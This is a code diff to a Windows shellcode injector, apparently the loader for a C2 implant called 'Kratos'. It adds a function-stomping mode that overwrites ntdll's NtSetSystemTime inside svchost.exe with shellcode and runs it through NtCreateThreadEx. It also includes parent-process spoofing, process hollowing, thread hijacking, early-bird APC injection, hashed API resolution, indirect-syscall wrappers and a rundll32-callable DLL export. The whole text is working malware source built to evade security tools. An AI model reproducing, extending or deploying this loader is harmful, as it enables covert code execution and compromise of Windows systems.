+        typedef FARPROC  (WINAPI *t_GPA)(HMODULE,LPCSTR);
+        typedef BOOL     (WINAPI *t_VPE)(HANDLE,LPVOID,SIZE_T,DWORD,PDWORD);
+        typedef BOOL     (WINAPI *t_WPM)(HANDLE,LPVOID,LPCVOID,SIZE_T,PSIZE_T);
+        typedef HANDLE   (WINAPI *t_OP) (DWORD,BOOL,DWORD);
+        typedef BOOL     (WINAPI *t_CH) (HANDLE);
+        typedef HANDLE   (WINAPI *t_CTS)(DWORD,DWORD);
+        typedef BOOL     (WINAPI *t_M32F)(HANDLE,LPMODULEENTRY32W);
+        typedef BOOL     (WINAPI *t_M32N)(HANDLE,LPMODULEENTRY32W);
+        typedef NTSTATUS (NTAPI  *t_NtCTE)(PHANDLE,ACCESS_MASK,PVOID,HANDLE,PVOID,PVOID,ULONG,SIZE_T,SIZE_T,SIZE_T,PVOID);
+        t_LLA   pLLA   = (t_LLA)  RK32(HF_LoadLibraryA);
+        t_GPA   pGPA   = (t_GPA)  RK32(HF_GetProcAddress);
+        t_VPE   pVPE   = (t_VPE)  RK32(HF_VirtualProtectEx);
+        t_WPM   pWPM   = (t_WPM)  RK32(HF_WriteProcessMemory);
+        t_OP    pOP    = (t_OP)   RK32(HF_OpenProcess);
+        t_CH    pCH    = (t_CH)   RK32(HF_CloseHandle);
+        t_CTS   pCTS   = (t_CTS)  RK32(HF_CreateToolhelp32Snapshot);
+        t_M32F  pM32F  = (t_M32F) RK32(HF_Module32FirstW);
+        t_M32N  pM32N  = (t_M32N) RK32(HF_Module32NextW);
+        t_NtCTE pNtCTE = (t_NtCTE)resolve(hNtdll, HF_NtCreateThreadEx);
+        if (!pLLA || !pGPA || !pVPE || !pWPM || !pOP) {
+            DBG("[FAIL] FuncStomp: API resolution failed");
+            { SIZE_T fz = sc_sz; pNtFVM((HANDLE)-1, (PVOID*)&sc, &fz, MEM_RELEASE); }
+            return 1;
+        }
+        /* Target svchost.exe: always running as SYSTEM in session 0 */
+        static const wchar_t fs_svc[] = {'s','v','c','h','o','s','t','.','e','x','e','\0'};
+        DWORD fs_pid = find_process_pid(fs_svc);
+        DBG_VAL("[FS1] svchost.exe PID", (unsigned long long)fs_pid);
+        HANDLE hFSSpawn = NULL;
+        if (!fs_pid) {
+            DBG("[FAIL] FuncStomp: svchost.exe not found");
+            { SIZE_T fz = sc_sz; pNtFVM((HANDLE)-1, (PVOID*)&sc, &fz, MEM_RELEASE); }
+            return 1;
+        }
+        /* Use ntdll!NtSetSystemTime: always loaded in every process, never called by notepad */
+        static const char sac_dll[]  = {'n','t','d','l','l','.','d','l','l','\0'};
+        static const char sac_func[] = {'N','t','S','e','t','S','y','s','t','e','m','T','i','m','e','\0'};
+        HMODULE hSac = pLLA(sac_dll);
+        if (!hSac) {
+            DBG("[FAIL] FuncStomp: LoadLibraryA(ntdll.dll) failed");
+            { SIZE_T fz = sc_sz; pNtFVM((HANDLE)-1, (PVOID*)&sc, &fz, MEM_RELEASE); }
+            return 1;
+        }
+        FARPROC pLocalFunc = pGPA(hSac, sac_func);
+        if (!pLocalFunc) {
+            DBG("[FAIL] FuncStomp: GetProcAddress(NtSetSystemTime) failed");
+            { SIZE_T fz = sc_sz; pNtFVM((HANDLE)-1, (PVOID*)&sc, &fz, MEM_RELEASE); }
+            return 1;
+        }
+        ULONG_PTR rva = (ULONG_PTR)pLocalFunc - (ULONG_PTR)hSac;
+        DBG_HEX("[FS2] NtSetSystemTime RVA", (unsigned long long)rva);
+        /* Resolve remote base of ntdll.dll via TH32CS_SNAPMODULE for ASLR correctness */
+        PVOID pStompTarget = NULL;
+        if (pCTS && pM32F && pM32N) {
+            HANDLE hSnap = pCTS(0x00000008 /* TH32CS_SNAPMODULE */, fs_pid);
+            if (hSnap != INVALID_HANDLE_VALUE) {
+                MODULEENTRY32W me = {0};
+                me.dwSize = sizeof(me);
+                static const wchar_t sac_dllw[] = {'n','t','d','l','l','.','d','l','l','\0'};
+                if (pM32F(hSnap, &me)) {
+                    do {
+                        const wchar_t *mn = me.szModule, *ref = sac_dllw;
+                        while (*mn && *ref && ((*mn|32)==(*ref|32))) { mn++; ref++; }
+                        if (!*mn && !*ref) {
+                            pStompTarget = (PVOID)((ULONG_PTR)me.modBaseAddr + rva);
+                            break;
+                        }
+                    } while (pM32N(hSnap, &me));
+                }
+                pCH(hSnap);
+            }
+        }
+        if (!pStompTarget) {
+            DBG("[FS3] SNAPMODULE fallback: same-base assumption");
+            pStompTarget = (PVOID)pLocalFunc;
+        }
+        DBG_HEX("[FS3] remote stomp address", (unsigned long long)(ULONG_PTR)pStompTarget);
+        HANDLE hFSProc = pOP(PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_CREATE_THREAD, FALSE, fs_pid);
+        if (hFSSpawn && pCH) pCH(hFSSpawn);
+        if (!hFSProc) {
+            DBG("[FAIL] FuncStomp: OpenProcess failed");
+            { SIZE_T fz = sc_sz; pNtFVM((HANDLE)-1, (PVOID*)&sc, &fz, MEM_RELEASE); }
+            return 1;
+        }
+        DWORD old_prot = 0;
+        pVPE(hFSProc, pStompTarget, sc_sz, PAGE_READWRITE, &old_prot);
+        SIZE_T written = 0;
+        BOOL wr_ok = pWPM(hFSProc, pStompTarget, sc, sc_sz, &written);
+        DBG_VAL("[FS4] bytes written", (unsigned long long)written);
+#ifdef USE_WIPE
+        memset(sc, 0, sc_sz);
+#endif
+        { SIZE_T fz = sc_sz; pNtFVM((HANDLE)-1, (PVOID*)&sc, &fz, MEM_RELEASE); }
+        if (!wr_ok) {
+            DBG("[FAIL] FuncStomp: WriteProcessMemory failed");
+            if (pCH) pCH(hFSProc);
+            return 1;
+        }
+        pVPE(hFSProc, pStompTarget, sc_sz, PAGE_EXECUTE_READWRITE, &old_prot);
+        DBG("[FS5] function stomped");
+        HANDLE hThreadFS = NULL;
+        NTSTATUS stFS = pNtCTE(&hThreadFS, THREAD_ALL_ACCESS, NULL, hFSProc, pStompTarget, NULL, 0, 0, 0, 0, NULL);
+        DBG_HEX("[FS6] NtCreateThreadEx status", (unsigned long long)(ULONG)stFS);
+        if (hThreadFS && pCH) pCH(hThreadFS);
+        if (pCH) pCH(hFSProc);
     }
 #else
     /* Spawn target process suspended */
@@ -1021,14 +1655,18 @@ int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, int) {
     HANDLE hParent = NULL;
 
     if (pal) {
-        DWORD epid = find_process_pid(L"explorer.exe");
-        DBG_VAL("[7] Explorer PID", epid);
+        /* Use target process name as PPID spoof parent instead of hardcoded explorer.exe */
+        const wchar_t *ppid_name = target;
+        const wchar_t *p = target;
+        while (*p) { if (*p == L'\\' || *p == L'/') ppid_name = p + 1; p++; }
+        DWORD epid = find_process_pid(ppid_name);
+        DBG_VAL("[7] PPID target PID", epid);
         if (epid && pOP) hParent = pOP(PROCESS_CREATE_PROCESS, FALSE, epid);
         if (hParent) {
-            DBG("[7] OpenProcess(explorer) OK");
+            DBG("[7] OpenProcess(target) OK for PPID spoof");
             if (pUPTA)
                 pUPTA(pal, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &hParent, sizeof(HANDLE), NULL, NULL);
-        } else { DBG("[WARN] OpenProcess(explorer) failed - no PPID spoof"); }
+        } else { DBG("[WARN] OpenProcess(target) failed - no PPID spoof"); }
         siex.lpAttributeList = pal;
     } else { DBG("[WARN] InitializeProcThreadAttributeList failed"); }
 
@@ -1068,7 +1706,7 @@ int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, int) {
 
     /* Alloc RW in target process */
     PVOID  remote = NULL;
-    SIZE_T alloc_sz = payload_size;
+    SIZE_T alloc_sz = sc_sz;
     NTSTATUS st = pNtAVM(pi.hProcess, &remote, 0, &alloc_sz, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
     if (!remote) {
         DBG_HEX("[FAIL] NtAllocateVirtualMemory (remote) NTSTATUS", (unsigned long long)(ULONG)st);
@@ -1081,12 +1719,12 @@ int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, int) {
     DBG_HEX("[10] remote alloc addr", (unsigned long long)(ULONG_PTR)remote);
 
     /* Write shellcode */
-    st = pNtWVM(pi.hProcess, remote, sc, payload_size, NULL);
+    st = pNtWVM(pi.hProcess, remote, sc, sc_sz, NULL);
     DBG_HEX("[11] NtWriteVirtualMemory status", (unsigned long long)(ULONG)st);
-    DBG_VAL("[11] bytes written (payload_size)", (unsigned long long)payload_size);
+    DBG_VAL("[11] bytes written (sc_sz)", (unsigned long long)sc_sz);
 
 #ifdef USE_WIPE
-    memset(sc, 0, payload_size);
+    memset(sc, 0, sc_sz);
     DBG("[12] Local shellcode wiped");
 #endif
     { SIZE_T fz = sc_sz; pNtFVM((HANDLE)-1, (PVOID*)&sc, &fz, MEM_RELEASE); }
@@ -1094,7 +1732,7 @@ int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, int) {
 
     /* RW -> RX */
     PVOID  prot_base = remote;
-    SIZE_T prot_sz   = payload_size;
+    SIZE_T prot_sz   = sc_sz;
     ULONG  old_prot  = 0;
     st = pNtPVM(pi.hProcess, &prot_base, &prot_sz, PAGE_EXECUTE_READ, &old_prot);
     DBG_HEX("[13] NtProtectVirtualMemory (RW->RX) status", (unsigned long long)(ULONG)st);
@@ -1107,15 +1745,25 @@ int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, int) {
         typedef NTSTATUS (NTAPI *t_NtGCT)(HANDLE, PCONTEXT);
         typedef NTSTATUS (NTAPI *t_NtSCT)(HANDLE, PCONTEXT);
 
+#ifdef USE_HELLSHALL
+        auto pNQIP  = [](HANDLE h, DWORD c, PVOID i, ULONG l, PULONG r) {
+            return hg_NtQueryInformationProcess(h, c, i, l, r); };
+        auto pNtRVM = [](HANDLE h, PVOID a, PVOID b, SIZE_T sz, PSIZE_T r) {
+            return hg_NtReadVirtualMemory(h, a, b, sz, r); };
+        auto pNtUVS = [](HANDLE h, PVOID b) { return hg_NtUnmapViewOfSection(h, b); };
+        auto pGCT   = [](HANDLE h, PCONTEXT c) { return hg_NtGetContextThread(h, c); };
+        auto pSCT   = [](HANDLE h, PCONTEXT c) { return hg_NtSetContextThread(h, c); };
+        {
+#else
         t_NQIP  pNQIP  = (t_NQIP) resolve(hNtdll, HF_NtQueryInformationProcess);
         t_NtRVM pNtRVM = (t_NtRVM)resolve(hNtdll, HF_NtReadVirtualMemory);
         t_NtUVS pNtUVS = (t_NtUVS)resolve(hNtdll, HF_NtUnmapViewOfSection);
         t_NtGCT pGCT   = (t_NtGCT)resolve(hNtdll, HF_NtGetContextThread);
         t_NtSCT pSCT   = (t_NtSCT)resolve(hNtdll, HF_NtSetContextThread);
-
         if (!pNQIP || !pNtRVM || !pNtUVS || !pGCT || !pSCT) {
             DBG("[FAIL] Hollow: API resolution failed");
         } else {
+#endif
             /* Get PEB base via NtQueryInformationProcess(ProcessBasicInformation=0) */
             PROCESS_BASIC_INFORMATION pbi = {0};
             pNQIP(pi.hProcess, 0, &pbi, sizeof(pbi), NULL);
@@ -1131,12 +1779,9 @@ int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, int) {
 #endif
             DBG_HEX("[H1] PEB.ImageBase", (unsigned long long)(ULONG_PTR)imageBase);
 
-            if (imageBase) {
-                NTSTATUS stU = pNtUVS(pi.hProcess, imageBase);
-                DBG_HEX("[H2] NtUnmapViewOfSection status", (unsigned long long)(ULONG)stU);
-            } else {
-                DBG("[WARN] Hollow: imageBase NULL, unmap skipped");
-            }
+            /* Skip NtUnmapViewOfSection: unmapping causes loader state issues with Donut PE bootstrap.
+               RIP redirect alone (same as thread hijacking) is sufficient and more reliable. */
+            DBG("[H2] Unmap skipped - RIP redirect only");
 
             CONTEXT ctx = {0};
             ctx.ContextFlags = CONTEXT_FULL;
@@ -1155,8 +1800,13 @@ int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, int) {
     {
         typedef NTSTATUS (NTAPI *t_NtGCT)(HANDLE, PCONTEXT);
         typedef NTSTATUS (NTAPI *t_NtSCT)(HANDLE, PCONTEXT);
+#ifdef USE_HELLSHALL
+        auto pGCT = [](HANDLE h, PCONTEXT c) { return hg_NtGetContextThread(h, c); };
+        auto pSCT = [](HANDLE h, PCONTEXT c) { return hg_NtSetContextThread(h, c); };
+#else
         t_NtGCT pGCT = (t_NtGCT)resolve(hNtdll, HF_NtGetContextThread);
         t_NtSCT pSCT = (t_NtSCT)resolve(hNtdll, HF_NtSetContextThread);
+#endif
         DBG("[TH] === THREAD HIJACKING MODE ===");
         if (pGCT && pSCT) {
             CONTEXT ctx = {0};
@@ -1180,8 +1830,13 @@ int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, int) {
     {
         DBG("[EB] === EARLY BIRD APC MODE ===");
         typedef NTSTATUS (NTAPI *t_NtQAT)(HANDLE,PVOID,PVOID,PVOID,PVOID);
+#ifdef USE_HELLSHALL
+        auto pNtQAT = [](HANDLE h, PVOID r, PVOID a1, PVOID a2, PVOID a3) {
+            return hg_NtQueueApcThread(h, r, a1, a2, a3); };
+#else
         t_NtQAT pNtQAT = (t_NtQAT)resolve(hNtdll, HF_NtQueueApcThread);
         DBG_HEX("[EB1] NtQueueApcThread resolved", (unsigned long long)(ULONG_PTR)pNtQAT);
+#endif
         if (pNtQAT) {
             NTSTATUS stA = pNtQAT(pi.hThread, (PVOID)remote, NULL, NULL, NULL);
             DBG_HEX("[EB2] NtQueueApcThread status", (unsigned long long)(ULONG)stA);
@@ -1199,5 +1854,27 @@ int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, int) {
 
 #endif /* USE_REMOTE_THREAD */
 
+#if defined(USE_SELF_INJECT) || defined(USE_FIBER_INJECT) || defined(USE_MODULE_STOMP) || defined(USE_LOCAL_MAP_INJECT)
+    /* Kratos workers now run in this process - keep the process alive indefinitely */
+    DBG("[SLEEP] Keeping process alive for injected payload...");
+    {
+        typedef NTSTATUS (NTAPI *t_NtDE)(BOOLEAN, PLARGE_INTEGER);
+        t_NtDE pNtDE = (t_NtDE)resolve(hNtdll, HF_NtDelayExecution);
+        if (pNtDE) {
+            LARGE_INTEGER li = {0};
+            li.QuadPart = -0x7FFFFFFFFFFFFFFFLL;
+            for(;;) pNtDE(FALSE, &li);
+        }
+    }
+#endif
+
     return 0;
 }
+
+#ifdef BUILD_DLL
+BOOL WINAPI DllMain(HINSTANCE, DWORD, LPVOID) { return TRUE; }
+
+extern "C" __declspec(dllexport) void __stdcall Run(HWND, HINSTANCE, LPSTR, int) {
+    WinMain(NULL, NULL, NULL, 0);
+}
+#endif
